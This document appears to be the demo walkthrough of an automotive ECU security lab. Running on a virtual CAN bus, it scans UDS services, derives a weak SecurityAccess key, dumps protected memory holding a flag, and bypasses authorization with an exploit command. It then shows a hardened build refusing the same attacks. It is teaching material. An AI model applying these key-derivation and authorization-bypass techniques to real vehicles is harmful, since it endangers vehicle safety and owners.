# Demo — attacking the target end to end

This walks through the full chain on a virtual CAN bus. Linux only (SocketCAN);
on macOS/Windows run it inside the provided Docker image.

## 0. Bring up the bus and build

```bash
sudo bash docker/setup-vcan.sh vcan0          # create vcan0
cmake -S . -B build && cmake --build build     # build the ECU
pip install -e ./toolkit                        # install ecutk
```

## 1. Start the (insecure) target

```bash
./build/ecu/ecu --iface vcan0 --insecure
# ecu-security-lab on vcan0  rx=0x7E0 tx=0x7E8  mode=insecure
```

Leave it running; open a second shell for the attacker.

## 2. Scan which services answer

```bash
python -m ecutk scan --iface vcan0
# supported services: 0x10, 0x22, 0x2e, 0x23, 0x27, 0x3e
```

## 3. Unlock SecurityAccess by deriving the key

```bash
python -m ecutk unlock --iface vcan0
# derived key: 0x000000a5
# unlocked
```

The toolkit requested a seed and computed `key = seed XOR 0xA5A5A5A5` — one shot,
no brute force (weaknesses #1 and #2).

## 4. Dump the secret

```bash
python -m ecutk dump --iface vcan0 --addr 0xC0 --size 32
# c0 c1 ... 46 4c 41 47 7b ...
# ........FLAG{ecu_secret_unlocked}...
```

## 5. Or run the whole chain at once

```bash
python -m ecutk exploit --iface vcan0
# recovered: FLAG{ecu_secret_unlocked}
```

`exploit` doesn't even send a key — it abuses the authorization bug (#4): a bare
seed request is enough for ReadMemoryByAddress to serve protected memory.

## 6. Compare against the hardened build

```bash
./build/ecu/ecu --iface vcan0 --secure
python -m ecutk exploit --iface vcan0
# target refused: NRC 0x31 (requestOutOfRange) ...
```

The secure build fixes the authorization gate, rate-limits SecurityAccess, and
returns uniform NRCs — the same attacks now fail. See
[VULNERABILITIES.md](VULNERABILITIES.md).

> The CI workflow performs steps 1–5 automatically against the target on `vcan`
> (`tests/test_e2e.py`), so the attacks are exercised on every push.
